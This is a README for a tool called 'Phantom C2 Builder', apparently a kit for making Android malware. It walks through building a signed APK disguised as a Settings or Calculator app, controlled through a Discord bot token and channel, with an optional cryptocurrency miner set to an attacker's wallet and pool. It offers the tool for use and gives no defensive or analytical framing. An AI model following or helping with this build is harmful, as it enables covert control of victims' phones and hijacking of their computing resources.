# Phantom C2 Builder

## Usage

```bash
./builder/build.sh
```

## Steps

1. **Choose Design** - Select app appearance (Settings, Calculator, etc.)
2. **Target Android** - Select minimum/target SDK version
3. **Select Features** - Enable/disable plugins
4. **Bot Config** - Discord bot token and channel ID
5. **Miner Config** - Wallet address and pool (if miner enabled)
6. **App Name** - Display name on device
7. **Build** - Compile and sign APK

## Output

APK is generated at:
```
app/build/outputs/apk/release/openaccess-vX.X.X.apk
```

## Requirements

- Android SDK
- Java 17+
- Gradle
- Python 3 (for token encoding)
